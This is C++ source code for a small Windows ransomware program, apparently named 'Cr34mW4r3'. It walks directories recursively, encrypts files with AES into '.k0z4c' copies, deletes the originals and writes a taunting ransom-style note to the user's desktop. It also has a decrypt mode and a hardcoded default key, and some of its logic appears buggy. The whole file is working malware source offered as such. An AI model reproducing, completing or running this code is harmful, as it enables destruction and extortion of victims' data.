#include "encryptor.h"
#include <shlwapi.h>
#include <vector>
#include <fstream>
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "advapi32.lib")

using namespace std;

#define CREAMWARE_EXT L".k0z4c"
#define NOTE_FILE L"README.txt"

enum modeFlag_t { encrypt, decrypt };

void writeNote() {
    size_t(len);
    wchar_t* value;
    errno_t err = _wdupenv_s(&value, &len, L"HOMEPATH");

    wstring homePath = static_cast<wstring>(value);

    ofstream os(homePath + L"\\Desktop\\" + NOTE_FILE);
    if (!os) {
        cout << "Some problem writing the note..." << endl;
        return;
    }

    os << "You got C.R.E.A.M.E.D by k0z4c mf" << endl;
    os.close();
    free(value);
}

BOOL FindFile(const std::wstring &directory, wstring ext, const wchar_t* aeskey, DWORD& errCode, modeFlag_t op)
{
    // only local files - \\*
    std::wstring tmp = directory + L"\\*";
    WIN32_FIND_DATAW file;
    HANDLE search_handle = FindFirstFileW(tmp.c_str(), &file);
    bool mode = static_cast<bool>(op);
    ext = (op == decrypt ? L"*.k0z4c" : ext);

    if (search_handle != INVALID_HANDLE_VALUE)
    {
        std::vector<std::wstring> directories;

        do
        {
            if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                if ((!lstrcmpW(file.cFileName, L".")) || (!lstrcmpW(file.cFileName, L"..")))
                    continue;
            }

            tmp = directory + L"\\" + std::wstring(file.cFileName);
            wcout << tmp << endl;
            if (!(file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
              && PathMatchSpecW(file.cFileName, ext.c_str())) {
                auto newFileName = (
                    op == encrypt ?
                    (tmp + CREAMWARE_EXT) : tmp.substr(0, (tmp.size() - (sizeof(CREAMWARE_EXT) / sizeof(wchar_t) - 1))
                ));

                wcout << "[*] Encrypting " << tmp;
                wcout << " to " << newFileName << endl;

                encryptFile(
                    tmp.c_str(), newFileName.c_str(),
                    aeskey, mode
                );

                DeleteFileW(tmp.c_str());
                wcout << tmp << endl;
            }           

            if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                directories.push_back(tmp);
        } while (FindNextFileW(search_handle, &file));

        FindClose(search_handle);

        for (std::vector<std::wstring>::iterator iter = directories.begin(), end = directories.end(); iter != end; ++iter)
            FindFile(*iter, ext, aeskey, errCode, op);
        return TRUE;
    } else {
        errCode = GetLastError();
        return FALSE;
    }
}

const wstring sanitizePath(wstring path) {
     if('\\' == path[path.size() - 1]) {
         path.pop_back();
     }
     return path;
}

int wmain(int argc, wchar_t* argv[])
{
    auto printNice = [](const wchar_t* s) {
        wcout << "[*] " << s << endl;
    };

    const wchar_t* help =
        L"[*] This is  the Cr34mW4r3 manpage\n"
        L"[+] usage: creamware <dirpath> <b64(aeskey-16)> <encrypt||decrypt>\n"
        L"[+] if aeskey-16 is not specified the following key will be used:\n"
        L"[*] aeskey: 3igcZhRdWq96m3GUmTAiv9\n";

    if (argc < 1) {
        wcout << help;
        return 0;
    }

    const wstring directoryPath = sanitizePath(argv[1]);

    // command to encrypt
    // creamware <path> [key]
    // to decrypt
    // creamware <path> <key> decrypt
    // if no key was specified then is 3igcZhRdWq96m3GUmTAiv9
    DWORD errCode = 0;
    modeFlag_t flagMode = (argc == 4 ? decrypt : encrypt);
    auto aeskey = (argc == 3 ? argv[2] : L"3igcZhRdWq96m3GUmTAiv9");
    if (flagMode == decrypt) {
        if (FindFile(directoryPath, L"", aeskey, errCode, decrypt) != TRUE) {
            printNice(L"The path exists? ...");
            return 1;
        }
    } else {
        if (FindFile(directoryPath, L"", aeskey, errCode, encrypt) != TRUE) {
            printNice(L"The path exists? ...");
            return 1;
        }
        writeNote();
        cout << "hello" << endl;
    }

    return 0;
}
